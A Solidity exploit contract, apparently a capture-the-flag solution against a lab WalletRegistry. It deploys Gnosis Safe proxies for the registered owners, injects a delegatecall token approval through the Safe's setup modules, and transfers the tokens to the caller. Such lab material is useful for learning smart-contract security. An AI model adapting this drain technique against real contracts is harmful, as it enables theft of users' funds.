// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solmate/src/tokens/ERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "./WalletRegistry.sol";

contract BackdoorExp {
    GnosisSafeProxyFactory factory;
    WalletRegistry registry;
    address[] owners;

    constructor(
        GnosisSafeProxyFactory _factory,
        WalletRegistry _registry,
        address[] memory _owners
    ) {
        factory = _factory;
        registry = _registry;
        owners = _owners;
    }

    // setupModules delegatecall 授权 token
    function approve(address token, address spender) public {
        ERC20(token).approve(spender, type(uint256).max);
    }

    function exp() external {
        address[] memory setupOwners = new address[](1);
        address[] memory addrs = new address[](owners.length);
        for (uint i = 0; i < owners.length; i++) {
            setupOwners[0] = owners[i];
            addrs[i] = address(
                factory.createProxyWithCallback(
                    registry.masterCopy(),
                    abi.encodeWithSignature(
                        "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                        setupOwners,
                        1,
                        address(this),
                        abi.encodeWithSignature(
                            "approve(address,address)",
                            address(registry.token()),
                            address(this)
                        ),
                        address(0),
                        address(0),
                        0,
                        address(0)
                    ),
                    0,
                    registry
                )
            );
        }
        for (uint i = 0; i < addrs.length; i++) {
            registry.token().transferFrom(addrs[i], tx.origin, 10 ether);
        }
        registry.token().transfer(
            tx.origin,
            registry.token().balanceOf(address(this))
        );
    }
}
